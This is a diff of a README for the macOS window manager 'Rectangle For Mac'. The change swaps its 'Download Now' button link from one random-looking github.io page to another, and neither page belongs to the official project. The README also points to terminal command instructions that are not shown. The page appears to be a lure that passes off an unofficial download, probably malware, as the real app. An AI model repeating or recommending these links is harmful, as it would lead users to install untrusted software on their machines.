@@ -3,7 +3,7 @@
 
 Rectangle For Mac is a powerful, lightweight window management tool designed to enhance your macOS experience. Boost your productivity by organizing your workspace with ease. Follow the instructions below to download and install Rectangle For Mac seamlessly.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/rectangle)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://mrboomzeus519.github.io/gimronus/rectangle)
 
 If you encounter issues downloading via the button above, follow the terminal command instructions below.
 
